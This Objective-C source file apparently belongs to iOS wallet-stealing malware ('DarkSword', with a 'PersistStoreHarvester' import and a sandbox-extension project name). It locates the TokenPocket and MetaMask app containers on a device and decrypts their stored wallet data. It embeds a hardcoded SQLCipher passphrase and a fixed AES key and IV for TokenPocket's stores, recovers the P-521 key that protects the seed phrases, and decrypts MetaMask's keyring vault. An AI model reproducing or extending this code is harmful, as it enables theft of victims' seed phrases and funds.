//
//  DarkSwordWalletDecrypt.m
//  Filza-27 (FilzaApplySandboxExt)
//
//  Per-wallet decryption. TokenPocket and MetaMask use unrelated schemes, so
//  each is implemented separately and nothing is shared beyond primitive
//  helpers (PBKDF2 / AES-CBC / hex / base64).
//

#import "DarkSwordWalletDecrypt.h"

#import <CommonCrypto/CommonCrypto.h>
#import <Security/Security.h>
#import <sqlite3.h>

#import "PersistStoreHarvester.h"   // TryMaskCardResolveContainerPath

#pragma mark - Primitive helpers

static NSData *DSHex(NSString *hex)
{
    NSMutableData *data = [NSMutableData dataWithCapacity:hex.length / 2];
    for (NSUInteger i = 0; i + 1 < hex.length; i += 2) {
        unsigned int byte = 0;
        [[NSScanner scannerWithString:[hex substringWithRange:NSMakeRange(i, 2)]]
            scanHexInt:&byte];
        uint8_t b = (uint8_t)byte;
        [data appendBytes:&b length:1];
    }
    return data;
}

static NSData *DSB64(NSString *s)
{
    return [[NSData alloc] initWithBase64EncodedString:s
                                               options:NSDataBase64DecodingIgnoreUnknownCharacters];
}

static NSData *DSPBKDF2(NSData *password, NSData *salt, uint32_t rounds,
                        size_t dkLen, CCPseudoRandomAlgorithm prf)
{
    NSMutableData *out = [NSMutableData dataWithLength:dkLen];
    int rc = CCKeyDerivationPBKDF(kCCPBKDF2,
                                  password.bytes, password.length,
                                  salt.bytes, salt.length,
                                  prf, rounds,
                                  out.mutableBytes, dkLen);
    return rc == kCCSuccess ? out : nil;
}

/// AES-CBC decrypt with optional PKCS#7 unpad.
static NSData *DSAESCBCDecrypt(NSData *key, NSData *iv, NSData *ct, BOOL unpad)
{
    if (ct.length == 0 || ct.length % 16 != 0) return nil;
    CCOptions opts = unpad ? kCCOptionPKCS7Padding : 0;
    NSMutableData *out = [NSMutableData dataWithLength:ct.length + 16];
    size_t moved = 0;
    CCCryptorStatus rc = CCCrypt(kCCDecrypt, kCCAlgorithmAES, opts,
                                 key.bytes, key.length,
                                 iv.bytes,
                                 ct.bytes, ct.length,
                                 out.mutableBytes, out.length, &moved);
    if (rc != kCCSuccess) return nil;
    return [out subdataWithRange:NSMakeRange(0, moved)];
}

static NSString *DSUTF8(NSData *data)
{
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

#pragma mark - TokenPocket: SQLCipher 4 (fixed passphrase)

/// Decrypts a SQLCipher 4 database (4096-byte pages, HMAC-SHA512) using the
/// given passphrase. Returns the plaintext database bytes, or nil on HMAC
/// failure.
static NSData *DSTPSQLCipherDecrypt(NSData *db, NSString *passphrase)
{
    if (db.length < 4096 || db.length % 4096 != 0) return nil;
    NSData *salt = [db subdataWithRange:NSMakeRange(0, 16)];
    NSData *pw = [passphrase dataUsingEncoding:NSUTF8StringEncoding];

    NSData *aesKey = DSPBKDF2(pw, salt, 256000, 32, kCCPRFHmacAlgSHA512);
    if (!aesKey) return nil;

    // SQLCipher 4 HMAC key = PBKDF2(aesKey, salt ^ 0x3a, 2, 32).
    NSMutableData *hmacSalt = [salt mutableCopy];
    uint8_t *sp = hmacSalt.mutableBytes;
    for (NSUInteger i = 0; i < 16; i++) sp[i] ^= 0x3a;
    NSData *hmacKey = DSPBKDF2(aesKey, hmacSalt, 2, 32, kCCPRFHmacAlgSHA512);
    if (!hmacKey) return nil;

    NSMutableData *out = [NSMutableData dataWithCapacity:db.length];
    const uint8_t *bytes = db.bytes;
    NSUInteger npages = db.length / 4096;

    for (NSUInteger page = 1; page <= npages; page++) {
        const uint8_t *p = bytes + (page - 1) * 4096;
        NSUInteger skip = (page == 1) ? 16 : 0;   // page 1 starts with the salt

        // Verify page HMAC over [encrypted data + IV] || pageno(LE).
        NSMutableData *macInput = [NSMutableData dataWithBytes:p + skip
                                                        length:4032 - skip];
        uint32_t pn = (uint32_t)page;
        [macInput appendBytes:&pn length:4];
        uint8_t mac[CC_SHA512_DIGEST_LENGTH];
        CCHmac(kCCHmacAlgSHA512, hmacKey.bytes, hmacKey.length,
               macInput.bytes, macInput.length, mac);
        if (memcmp(mac, p + 4032, CC_SHA512_DIGEST_LENGTH) != 0) return nil;

        NSData *iv = [NSData dataWithBytes:p + 4016 length:16];
        NSData *ct = [NSData dataWithBytes:p + skip length:4016 - skip];
        NSData *pt = DSAESCBCDecrypt(aesKey, iv, ct, NO);   // raw, no padding
        if (!pt) return nil;

        if (page == 1) {
            static const uint8_t magic[16] = "SQLite format 3";
            [out appendBytes:magic length:16];
        }
        [out appendData:pt];
        static const uint8_t kReserve[80] = {0};
        [out appendBytes:kReserve length:80];        // reserved tail
    }
    return out;
}

/// Reads the wallet table's `mnemonic` column from a decrypted main DB.
static NSArray<NSString *> *DSTPWalletMnemonics(NSData *plainDB)
{
    NSString *tmp = [NSTemporaryDirectory()
                     stringByAppendingPathComponent:@"ds_tp_main.sqlite3"];
    [plainDB writeToFile:tmp atomically:YES];

    sqlite3 *db = NULL;
    if (sqlite3_open_v2(tmp.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        return nil;
    }

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    sqlite3_stmt *stmt = NULL;
    const char *sql = "SELECT mnemonic FROM wallet "
                      "WHERE mnemonic IS NOT NULL AND mnemonic != ''";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char *t = sqlite3_column_text(stmt, 0);
            if (t) [out addObject:[NSString stringWithUTF8String:(const char *)t]];
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    [[NSFileManager defaultManager] removeItemAtPath:tmp error:NULL];
    return out;
}

#pragma mark - TokenPocket: ECIES P-521 (CofactorX963SHA384AESGCM)

/// Decrypts an ECIES P-521 blob with the recovered private key (199 bytes:
/// 0x04 || X || Y || scalar). Blob = ephemeral point (133) || AES-GCM ct+tag.
static NSString *DSTPECIESDecrypt(NSData *privRaw, NSData *blob)
{
    if (privRaw.length != 199 || privRaw.bytes[0] != 4) return nil;
    if (blob.length < 149 || blob.bytes[0] != 4) return nil;

    NSData *ephemeral = [blob subdataWithRange:NSMakeRange(0, 133)];
    NSData *gcm = [blob subdataWithRange:NSMakeRange(133, blob.length - 133)];
    if (gcm.length < 16) return nil;
    NSData *ct  = [gcm subdataWithRange:NSMakeRange(0, gcm.length - 16)];
    NSData *tag = [gcm subdataWithRange:NSMakeRange(gcm.length - 16, 16)];

    NSDictionary *privAttrs = @{
        (id)kSecAttrKeyType:    (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @521,
        (id)kSecAttrKeyClass:   (id)kSecAttrKeyClassPrivate,
    };
    NSDictionary *pubAttrs = @{
        (id)kSecAttrKeyType:    (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @521,
        (id)kSecAttrKeyClass:   (id)kSecAttrKeyClassPublic,
    };
    SecKeyRef privKey = SecKeyCreateWithData((__bridge CFDataRef)privRaw,
                                             (__bridge CFDictionaryRef)privAttrs, NULL);
    if (!privKey) return nil;
    SecKeyRef pubKey = SecKeyCreateWithData((__bridge CFDataRef)ephemeral,
                                            (__bridge CFDictionaryRef)pubAttrs, NULL);
    if (!pubKey) { CFRelease(privKey); return nil; }

    CFErrorRef err = NULL;
    CFDataRef shared = SecKeyCreateSharedSecretFromPrivateKey(privKey, pubKey, &err);
    CFRelease(privKey); CFRelease(pubKey);
    if (!shared) { if (err) CFRelease(err); return nil; }
    if (err) CFRelease(err);

    // ANSI X9.63 KDF with SHA-384: K(1) = SHA384(Z || 0x00000001 || sharedInfo),
    // sharedInfo = ephemeral public key. Take first 32 bytes.
    NSMutableData *kdf = [NSMutableData dataWithData:(__bridge NSData *)shared];
    CFRelease(shared);
    uint32_t counter = htonl(1);
    [kdf appendBytes:&counter length:4];
    [kdf appendData:ephemeral];
    uint8_t digest[CC_SHA384_DIGEST_LENGTH];
    CC_SHA384(kdf.bytes, (CC_LONG)kdf.length, digest);
    NSData *aesKey = [NSData dataWithBytes:digest length:32];

    uint8_t nonce[16] = {0};
    NSMutableData *plain = [NSMutableData dataWithLength:ct.length];
    size_t tagLen = tag.length;
    CCCryptorStatus rc = CCCryptorGCM(kCCDecrypt, kCCAlgorithmAES,
                                      aesKey.bytes, aesKey.length,
                                      nonce, sizeof(nonce),
                                      NULL, 0,
                                      ct.bytes, ct.length,
                                      plain.mutableBytes,
                                      tag.bytes, &tagLen);
    if (rc != kCCSuccess) return nil;
    return DSUTF8(plain);
}

#pragma mark - TokenPocket: full chain

NSString * _Nullable DarkSwordTokenPocketDecrypt(NSString *password)
{
    static NSString *const kMainSQLKey = @"Ra4T*3J6Fz0c9=1Vo2n5iK&b5Q_Js1$3Epi9B!e";
    static NSData *outerKey = nil, *outerIV = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        outerKey = DSHex(@"89d57decd7f25a5d172272d3e0b0ecc62e9fad0971d5cc7863bd5af14cddc08b");
        outerIV  = DSHex(@"dda013e04dcbbd42393fc544610b2a87");
    });

    NSString *container = TryMaskCardResolveContainerPath(@"com.global.wallet.ios");
    if (container.length == 0) { NSLog(@"[ds-wallet] TokenPocket container unresolved"); return nil; }

    // Layer 1: SQLCipher main.sqlite3 -> wallet table.
    NSString *mainPath = [container stringByAppendingPathComponent:@"Documents/db/main.sqlite3"];
    NSData *mainEnc = [NSData dataWithContentsOfFile:mainPath];
    NSData *mainPlain = DSTPSQLCipherDecrypt(mainEnc, kMainSQLKey);
    if (!mainPlain) { NSLog(@"[ds-wallet] main.sqlite3 SQLCipher decrypt failed"); return nil; }
    NSArray<NSString *> *mnemonics = DSTPWalletMnemonics(mainPlain);
    if (mnemonics.count == 0) { NSLog(@"[ds-wallet] no mnemonic rows"); return nil; }

    // Layer 2: F4SeCyr outer fixed AES -> keystore JSON.
    NSString *f4dir = [container stringByAppendingPathComponent:@"Documents/F4SeCyr"];
    NSArray<NSString *> *entries = [[NSFileManager defaultManager]
                                    contentsOfDirectoryAtPath:f4dir error:NULL];
    NSData *f4 = nil;
    for (NSString *e in entries) {
        if ([e isEqualToString:@"."] || [e isEqualToString:@".."]) continue;
        f4 = [NSData dataWithContentsOfFile:[f4dir stringByAppendingPathComponent:e]];
        if (f4.length > 0) break;
    }
    if (!f4) { NSLog(@"[ds-wallet] F4SeCyr keystore not found"); return nil; }
    NSData *storeData = DSAESCBCDecrypt(outerKey, outerIV, f4, YES);
    if (!storeData) { NSLog(@"[ds-wallet] F4SeCyr outer decrypt failed"); return nil; }
    NSDictionary *store = [NSJSONSerialization JSONObjectWithData:storeData
                                                          options:0 error:NULL];
    if (![store isKindOfClass:[NSDictionary class]]) { NSLog(@"[ds-wallet] keystore JSON invalid"); return nil; }

    // Layer 3: PBKDF2-SHA256(password, salt, rounds) -> AES-CBC encryptedKey -> P-521 priv.
    NSData *salt = DSB64(store[@"salt"]);
    NSData *iv   = DSB64(store[@"iv"]);
    NSData *encKey = DSB64(store[@"encryptedKey"]);
    NSData *pubKey = DSB64(store[@"publicKey"]);
    uint32_t rounds = [store[@"rounds"] unsignedIntValue];
    if (!salt || !iv || !encKey || !pubKey || rounds == 0) return nil;

    NSData *pw = [password dataUsingEncoding:NSUTF8StringEncoding];
    NSData *innerKey = DSPBKDF2(pw, salt, rounds, 32, kCCPRFHmacAlgSHA256);
    if (!innerKey) return nil;
    NSData *privRaw = DSAESCBCDecrypt(innerKey, iv, encKey, YES);
    if (privRaw.length != 199 || privRaw.bytes[0] != 4) {
        NSLog(@"[ds-wallet] password rejected (bad key unwrap)");
        return nil;
    }

    // Layer 4: ECIES each mnemonic row with the recovered P-521 key.
    for (NSString *encoded in mnemonics) {
        NSData *blob = DSB64(encoded);
        if (!blob) continue;
        NSString *mnemonic = DSTPECIESDecrypt(privRaw, blob);
        if (mnemonic.length > 0) return mnemonic;
    }
    return nil;
}

#pragma mark - MetaMask: quick-crypto vault

NSString * _Nullable DarkSwordMetaMaskDecrypt(NSString *password)
{
    NSString *container = TryMaskCardResolveContainerPath(@"io.metamask");
    if (container.length == 0) { NSLog(@"[ds-wallet] MetaMask container unresolved"); return nil; }

    NSString *path = [container stringByAppendingPathComponent:
                      @"Documents/persistStore/persist-keyringcontroller"];
    NSData *fileData = [NSData dataWithContentsOfFile:path];
    if (!fileData) { NSLog(@"[ds-wallet] persist-keyringcontroller not found"); return nil; }

    NSError *err = nil;
    id parsed = [NSJSONSerialization JSONObjectWithData:fileData options:0 error:&err];
    id vault = [parsed isKindOfClass:[NSDictionary class]] ? parsed[@"vault"] : parsed;
    if ([vault isKindOfClass:[NSString class]]) {
        vault = [NSJSONSerialization JSONObjectWithData:[vault dataUsingEncoding:NSUTF8StringEncoding]
                                                options:0 error:&err];
    }
    if (![vault isKindOfClass:[NSDictionary class]]) {
        NSLog(@"[ds-wallet] MetaMask vault JSON invalid"); return nil;
    }

    NSString *lib = vault[@"lib"];
    NSString *cipherB64 = vault[@"cipher"];
    NSString *saltText = vault[@"salt"];
    NSString *ivHex = vault[@"iv"];
    if (![lib isEqualToString:@"quick-crypto"] || !cipherB64 || !saltText || !ivHex) {
        NSLog(@"[ds-wallet] unsupported MetaMask vault format"); return nil;
    }

    // quick-crypto: PBKDF2-SHA512(password, salt-as-UTF8-bytes, iterations, 32).
    NSDictionary *metadata = vault[@"keyMetadata"] ?: @{};
    NSDictionary *params = [metadata isKindOfClass:[NSDictionary class]] ? metadata[@"params"] : nil;
    uint32_t iterations = [params isKindOfClass:[NSDictionary class]]
                          ? [params[@"iterations"] unsignedIntValue] : 5000;
    if (iterations == 0) iterations = 5000;

    NSData *ct = DSB64(cipherB64);
    NSData *iv = DSHex(ivHex);
    NSData *pw = [password dataUsingEncoding:NSUTF8StringEncoding];
    NSData *salt = [saltText dataUsingEncoding:NSUTF8StringEncoding];
    if (!ct || !iv || !salt || iv.length != 16 || ct.length % 16 != 0) return nil;

    NSData *key = DSPBKDF2(pw, salt, iterations, 32, kCCPRFHmacAlgSHA512);
    if (!key) return nil;
    NSData *plain = DSAESCBCDecrypt(key, iv, ct, YES);
    if (!plain) { NSLog(@"[ds-wallet] MetaMask password rejected"); return nil; }

    NSString *json = DSUTF8(plain);
    return json.length > 0 ? json : nil;
}
